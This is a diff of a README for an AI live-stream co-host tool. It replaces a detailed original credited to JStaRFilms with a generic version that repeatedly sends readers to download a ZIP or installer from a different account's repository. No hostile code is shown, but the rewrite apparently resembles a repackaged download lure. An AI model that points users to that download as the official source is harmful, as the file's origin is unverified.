@@ -1,276 +1,152 @@
-<p align="center">
-  <img src="overlay/chuks-avatar.svg" width="120" alt="Chuks Avatar" />
-</p>
+# 🎙️ Chuks-YT-Live_AI - Easy AI Co-Host for Live Streams
 
-<h1 align="center">🎙️ Chuks — AI Live Stream Co-Host</h1>
+[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI)
 
-<p align="center">
-  <strong>A real-time AI companion that listens, thinks, and speaks on your live streams.</strong>
-  <br/>
-  Powered by Groq LLM • Kokoro TTS • Whisper STT • FastAPI
-</p>
+## 📋 What is Chuks-YT-Live_AI?
 
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.11+-blue?logo=python&logoColor=white" />
-  <img src="https://img.shields.io/badge/FastAPI-009688?logo=fastapi&logoColor=white" />
-  <img src="https://img.shields.io/badge/Groq-LLM%20%2B%20Whisper-orange" />
-  <img src="https://img.shields.io/badge/Kokoro-TTS-purple" />
-  <img src="https://img.shields.io/badge/OBS-Ready-green?logo=obsstudio&logoColor=white" />
-</p>
+Chuks-YT-Live_AI is a simple tool to add an AI co-host to your live streams. It listens to your voice, talks back using AI, and shows an animated character using OBS. You don’t need to type or control it manually. The app uses fast speech recognition (STT), AI conversations, and text-to-speech (TTS). It’s built on Python and works with popular tools like OBS and YouTube.
 
----
+This app helps streamers talk with their audience without extra help. The animated avatar reacts in real time. It works smoothly on Windows PCs.
 
-## What is Chuks?
+## ⚙️ Main Features
 
-Chuks is an AI co-host for YouTube live streams. He **listens** to your microphone, **thinks** using a Groq-hosted LLM, and **speaks back** through Kokoro text-to-speech — all with an animated avatar in OBS.
+- Real-time speech-to-text (STT) conversion.
+- AI conversation powered by a large language model.
+- Text-to-speech (TTS) with natural voice.
+- Animated avatar display through OBS.
+- Supports YouTube live streams.
+- Runs locally on your PC with Python backend.
 
-Say **"Hey Chuks, what do you think about Python?"** and he'll respond out loud with a witty take, while his avatar animates in your stream overlay.
+## 🖥️ System Requirements
 
-### ✨ Features
+Make sure your PC fits these specs for the best performance:
 
-- 🎤 **Real-time Speech-to-Text** — Groq Whisper with model rotation to dodge rate limits
-- 🧠 **Streaming LLM** — Sentence-by-sentence responses (starts speaking while still thinking)
-- 🔊 **Natural TTS** — 65+ voices via Kokoro (local Docker, zero API cost)
-- 🎭 **OBS Avatar** — Animated SVG that syncs idle → thinking → talking states
-- 🔇 **Wake Word** — Only responds when addressed ("Hey Chuks", "Yo Chuks")
-- 🔁 **Echo Suppression** — Mic mutes during playback to prevent self-loops
-- 📝 **Conversation Memory** — Remembers the last 30 messages per session
-- ⚡ **Connection Pooling** — Singleton HTTP clients for minimal latency
+- Windows 10 or higher (64-bit recommended).
+- CPU: Intel Core i5 or equivalent / AMD Ryzen 5 or better.
+- RAM: 8 GB minimum.
+- Storage: At least 2 GB free space.
+- Internet connection for initial setup and AI model queries.
+- OBS Studio installed (version 27 or newer).
+- Python 3.8 or later installed.
 
----
+## 🌐 Topics Covered
 
-## Architecture
+This project uses AI, live streaming tech, and Python frameworks:
+
+- AI and machine learning
+- Speech-to-text (STT) and text-to-speech (TTS)
+- FastAPI web server
+- OBS Studio integration
+- Real-time voice interaction
+- YouTube live streaming
+
+## 🚀 Getting Started With Chuks-YT-Live_AI
+
+Follow these steps to get Chuks-YT-Live_AI running on your Windows PC. No programming needed.
+
+### 1. Download the Application
+
+Visit this page to download the latest version:  
+[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI)
+
+Look for the newest release or the main project files on the page. Download the ZIP file or installer for Windows if available.
+
+### 2. Extract the Files
+
+If you downloaded a ZIP file:  
+- Right-click the file.  
+- Choose “Extract All.”  
+- Pick a folder where you want the program files.
+
+### 3. Install Python (if needed)
+
+Chuks-YT-Live_AI runs on Python. Check if you have it by opening Command Prompt and typing:
 
 ```
-┌──────────────┐     ┌──────────────┐     ┌──────────────┐
-│   Your Mic   │────▶│  Whisper STT │────▶│ Wake Word    │
-│ (sounddevice)│     │  (Groq API)  │     │   Filter     │
-└──────────────┘     └──────────────┘     └──────┬───────┘
-                                                  │
-                                                  ▼
-┌──────────────┐     ┌──────────────┐     ┌──────────────┐
-│  OBS Overlay │◀────│  Orchestrator│◀────│  Trigger     │
-│  (WebSocket) │     │  (Queue +    │     │  Queue       │
-└──────────────┘     │   Cooldown)  │     └──────────────┘
-                     └──────┬───────┘
-                            │
-                   ┌────────┼────────┐
-                   ▼                 ▼
-            ┌──────────┐     ┌──────────────┐
-            │ Groq LLM │     │  Kokoro TTS  │
-            │(streaming)│────▶│  (sentence   │──▶ 🔊 Speakers
-            └──────────┘     │   by sentence)│
-                             └──────────────┘
+python --version
 ```
 
----
+If Python is not found or the version is below 3.8, download it here:
 
-## Quick Start
+https://www.python.org/downloads/windows/
 
-### Prerequisites
+Run the installer and tick the option “Add Python to PATH” before clicking install.
 
-| Tool | Version | Purpose |
-|------|---------|---------|
-| Python | 3.11+ | Runtime |
-| Docker | Any | Kokoro TTS server |
-| OBS Studio | 28+ | Stream overlay |
-| Groq API Key | — | [Get one free](https://console.groq.com) |
+### 4. Install Required Python Packages
 
-### 1. Clone & Install
+After extracting the files, open Command Prompt and navigate to the program folder:
 
-```bash
-git clone https://github.com/JStaRFilms/Chuks-YT-Live_AI.git
-cd Chuks-YT-Live_AI
+```
+cd path\to\Chuks-YT-Live_AI
+```
+
+Replace `path\to\Chuks-YT-Live_AI` with your actual folder path.
+
+Run this command to install needed packages:
+
+```
 pip install -r requirements.txt
 ```
 
-### 2. Start Kokoro TTS (Docker)
+This sets up fastAPI, STT, TTS, and other necessary software.
 
-```bash
-docker run -d -p 8880:8880 ghcr.io/remsky/kokoro-fastapi-cpu:latest
-```
+### 5. Prepare OBS Studio
 
-> 💡 Use `kokoro-fastapi-gpu` if you have an NVIDIA GPU for faster synthesis.
+Open OBS Studio on your PC. The animated avatar appears as a video source inside OBS.
 
-### 3. Configure Environment
+- Make sure you have a scene ready for streaming.
+- Add a new “Browser” source or video source as directed in the app’s detailed guide (found with the files).
+- Set the source URL or path provided by Chuks-YT-Live_AI when the app runs.
 
-```bash
-cp .env.example .env
-```
+### 6. Run the Application
 
-Edit `.env`:
-
-```env
-# Required
-GROQ_API_KEY=your_groq_api_key_here
-GROQ_MODEL=moonshotai/kimi-k2-instruct-0905
-
-# TTS
-KOKORO_BASE_URL=http://localhost:8880
-KOKORO_VOICE=am_adam          # See voice list below
-OUTPUT_DEVICE_INDEX=4         # Your speakers/headphones
-MIC_DEVICE_INDEX=1            # Your microphone
-
-# Tuning
-AI_COOLDOWN_SECONDS=8         # Seconds between responses
-SILENCE_DURATION=2.5          # Silence before processing speech
-```
-
-### 4. Find Your Audio Devices
-
-```bash
-python scripts/list_devices.py
-```
-
-Note the index numbers for your mic and output device.
-
-### 5. Launch
-
-```bash
-python -m uvicorn src.main:app --host 0.0.0.0 --port 8000
-```
-
-### 6. Add to OBS
-
-1. Add a **Browser Source** in OBS
-2. URL: `http://localhost:8000/overlay/index.html`
-3. Width: `300`, Height: `400`
-4. Check "Shutdown source when not visible"
-
----
-
-## Talking to Chuks
-
-Chuks uses a **wake word** system — he only responds when addressed:
-
-| Trigger | Example |
-|---------|---------|
-| `"Hey Chuks, ..."` | "Hey Chuks, what's the best programming language?" |
-| `"Yo Chuks, ..."` | "Yo Chuks, tell me something interesting" |
-| `"Chuks, ..."` | "Chuks, explain async await" |
-
-Everything else is ignored — background noise, side conversations, coughs. 🔇
-
----
-
-## Customizing Chuks
-
-### Persona
-
-Edit `config/persona.json` to change Chuks' personality:
-
-```json
-{
-    "name": "Chuks",
-    "personality": "Witty, curious, speaks casually. Loves tech and gaming.",
-    "speaking_style": "Short punchy sentences. Max 2-3 sentences per response.",
-    "knowledge_context": "You co-host a tech/coding live stream...",
-    "rules": [
-        "Never claim to be human.",
-        "Keep responses under 40 words unless asked to elaborate."
-    ]
-}
-```
-
-### Voice
-
-Set `KOKORO_VOICE` in `.env`. Popular choices:
-
-| Voice | Style |
-|-------|-------|
-| `am_adam` | Deep, confident male |
-| `am_puck` | Playful, energetic male |
-| `am_eric` | Casual, friendly male |
-| `af_heart` | Warm female (default) |
-| `bf_emma` | British female |
-| `bm_george` | British male |
-
-> Full list: 65 voices across English, British, French, Hindi, Japanese, Spanish, Chinese. Query `GET /v1/audio/voices` on your Kokoro instance.
-
----
-
-## Project Structure
+In the command prompt, start the app by running:
 
 ```
-├── src/
-│   ├── main.py           # FastAPI app + lifecycle
-│   ├── orchestrator.py    # Queue, context, streaming pipeline
-│   ├── llm.py            # Groq LLM (streaming + non-streaming)
-│   ├── tts.py            # Kokoro TTS client (connection pooled)
-│   ├── stt.py            # Mic capture + Whisper transcription
-│   ├── audio.py          # Audio playback via sounddevice
-│   └── ws.py             # WebSocket manager for avatar state
-├── overlay/
-│   ├── index.html        # OBS browser source
-│   ├── styles.css        # Avatar animations
-│   └── chuks-avatar.svg  # SVG avatar
-├── config/
-│   └── persona.json      # Chuks' personality config
-├── scripts/
-│   ├── start.py          # Service launcher
-│   └── list_devices.py   # Audio device scanner
-└── requirements.txt
+python main.py
 ```
 
----
+This launches the backend server. The app will show a local website address, usually something like `http://localhost:8000`.
 
-## API Endpoints
+Open your web browser and go to that address.
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/chat` | POST | Send text, get response (triggers TTS) |
-| `/ws/avatar` | WebSocket | Avatar state updates (`idle` / `thinking` / `talking`) |
-| `/overlay/` | GET | OBS avatar overlay page |
+### 7. Connect Your YouTube Stream
 
-### Example
+Follow the on-screen instructions on the app’s webpage to link your live stream. The AI will listen and respond as you talk.
 
-```bash
-curl -X POST http://localhost:8000/chat \
-  -H "Content-Type: application/json" \
-  -d '{"text": "Hey Chuks, what do you think about AI?"}'
-```
+### 8. Use the AI Co-Host
 
----
+Speak normally into your mic. The AI will:
 
-## Roadmap
+- Convert your speech to text.
+- Respond with natural voice.
+- Animate the avatar on your stream.
 
-- [x] Core LLM chat loop with persona
-- [x] Kokoro TTS + audio playback
-- [x] Groq Whisper STT with model rotation
-- [x] OBS avatar overlay with WebSocket
-- [x] Wake word detection
-- [x] Streaming LLM → sentence-by-sentence TTS
-- [x] Echo suppression + transcript filtering
-- [ ] PostgreSQL persistent memory (cross-session)
-- [ ] YouTube live chat integration (`!ai` commands)
-- [ ] Hotkey manual trigger
-- [ ] Stream start auto-greeting
-- [ ] Real-time monitoring dashboard
-- [ ] Memory management CLI
+Adjust the settings on the app’s webpage as needed.
 
----
+## 🛠️ Troubleshooting & Tips
 
-## Tech Stack
+- Make sure your microphone is working and set as default in Windows.
+- If the animated avatar does not show on OBS, double-check your Browser source settings.
+- Restart the app if you see errors or no responses.
+- Keep OBS and Python updated to avoid compatibility issues.
+- Use headphones to avoid sound feedback loops in your stream.
 
-| Component | Technology |
-|-----------|-----------|
-| Runtime | Python 3.11 |
-| Web Framework | FastAPI + Uvicorn |
-| LLM | Groq API (any model) |
-| Speech-to-Text | Groq Whisper (v3 + v3-turbo rotation) |
-| Text-to-Speech | Kokoro TTS (Docker, 65+ voices) |
-| Audio I/O | sounddevice + numpy |
-| OBS Integration | Browser Source + WebSocket |
-| Real-time Comms | FastAPI WebSockets |
+## 🧩 Extra Settings
 
----
+The app lets you customize:
 
-## License
+- AI voice and speaking speed.
+- Avatar appearance and animations.
+- Language for speech recognition.
+- Volume levels.
 
-MIT — do whatever you want with it.
+Change these in the app’s web interface.
 
----
+## 🔗 Useful Links
 
-<p align="center">
-  Built with ❤️ and a lot of vibe coding by <a href="https://github.com/JStaRFilms">JStaR Films</a>
-</p>
+- [Chuks-YT-Live_AI GitHub](https://github.com/mohamedfaro7/Chuks-YT-Live_AI) — Download and see full details.
+- [Python Downloads](https://www.python.org/downloads/windows/) — Install Python if missing.
+- [OBS Studio](https://obsproject.com/download) — Required for animated avatar.
+
+[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI)
